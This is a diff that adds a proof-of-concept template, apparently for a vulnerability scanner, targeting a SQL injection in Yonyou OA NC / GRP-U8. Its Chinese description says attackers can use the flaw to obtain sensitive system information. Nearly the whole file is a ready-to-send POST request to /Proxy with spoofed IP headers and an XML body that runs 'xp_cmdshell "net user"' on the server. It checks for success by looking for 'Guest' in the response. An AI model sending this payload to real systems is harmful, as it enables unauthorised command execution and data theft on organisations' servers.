@@ -1,0 +1,20 @@
+﻿<DudePoc_Name>用友 OA nc GRP-u8 sql注入</DudePoc_Name>
+<DudePoc_Description>用友nc等最新版本存在前台SQL注入漏洞，攻击者可利用该漏洞获取系统敏感信息等。</DudePoc_Description>
+<DudePoc_SetHeader>
+POST /Proxy HTTP/1.1
+Host: $<AttackHost>$
+Content-Length: 0
+X-Forwarded-For: 127.0.0.1
+X-Originating: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+User-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57
+</DudePoc_SetHeader>
+<DudePoc_SetData>
+cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell "net user"</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET>
+</DudePoc_SetData>
+<DudePoc_VerifyStatusCode>200</DudePoc_VerifyStatusCode>
+<DudePoc_VerifyData>Guest</DudePoc_VerifyData>
+<DudePoc_VerifyFile></DudePoc_VerifyFile>
+<DudePoc_AttackCode></DudePoc_AttackCode>
